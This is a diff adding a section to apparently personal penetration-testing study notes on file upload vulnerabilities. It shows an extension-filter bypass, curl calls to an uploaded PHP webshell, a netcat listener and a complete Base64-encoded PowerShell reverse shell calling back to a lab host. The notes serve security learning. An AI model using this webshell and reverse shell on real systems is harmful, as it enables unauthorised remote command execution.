@@ -448,6 +448,37 @@ File Upload Vulnerabilities (FUV)  are those vulnerabilities that are associated
 These vulnerabilities can be exposed in several different ways.  An executable file can be uploaded and then executed.  For example, we could upload a PHP file on a system where PHP is enabled and then execute it using a web-browser or cURL.
 It could present as a combination of both a file upload and a directory traversal.  We could use the directory traversal to overwrite an 'authorised_keys' file.
 Finally, it could consist a file upload vulnerability and then user interaction.  That is, upload a .docx file that has malicious macros included.
+#### Executable Files
+This type of vulnerability requires that an executable file to be uploaded and then run by the web-server.  Initially, this type of vulnerability requires the pen tester to locate a upload mechanism that can be exploited.  This is specific to the type of application.  A web CMS will likely have a function for a user to upload an 'avatar'.  Other types of web-applications will have different use cases for a file upload function.  
+The web-application may have a filtering system which will prevent the upload of executable files, normally by checking file extension.  Sometimes, these can be avoided by changing the file extension to uppercase.
+Once a file is uploaded, we can try to execute it using the 'cURL' application.
+~~~ bash
+# this is the curl function to try to run the executable file.
+curl http://192.168.0.1/subdirectory/uploads/simple-backdoor.pHP?cmd=dir
+
+# this function uses a different file extension (pHP) and includes the cmd=dir
+# this is the command that we want the web-application to run
+~~~
+We can try to establish a reverse shell by starting a 'Netcat listener'.  When creating a reverse shell the command we use includes special characters.
+~~~ bash
+# netcat listener for a reverse
+nc -nvlp 4444
+~~~
+In this example, we can use a one-line 'Power-Shell' script, however, as this script has several special characters, the script needs to be Base64 encoded.  We can do this in Power-Shell in Kali.
+~~~ PowerShell
+# create a variable with the powershell reverse shell script
+$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+# convert this string to bytes
+$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+# convert these bytes to a base64 encoded string.  This string will be executed with the PHP webshell that we uploaded in the previous step
+$EncodedText =[Convert]::ToBase64String($Bytes)
+~~~
+The variable '$EncodedText' contains the one line Power-Shell script which has been encoded in Base64.  The reverse shell is established by executing the PHP 'simple-backdoor.php' script using the cURL application.  The Base64 encoded script is passed to the 'simple-backdoor.php' script, which in turn establishes the reverse shell on port 4444.  The Netcat listener provides access to the reverse shell. 
+#### Non-Executable Files
+### SQL Injection
+
 ### OS Command Injection
 Web applications frequently need to interact with the underlying OS to undertake routine tasks like interacting with the file system.  Web applications should provide a specific API with prepared commands to interact with the OS which cannot be changed by user input.  These however are time consuming to create and maintain.  
 Frequently, developers rely on user input and then sanitise.  This means that user input is filtered cor any command sequences that might try to change the application's behavior.
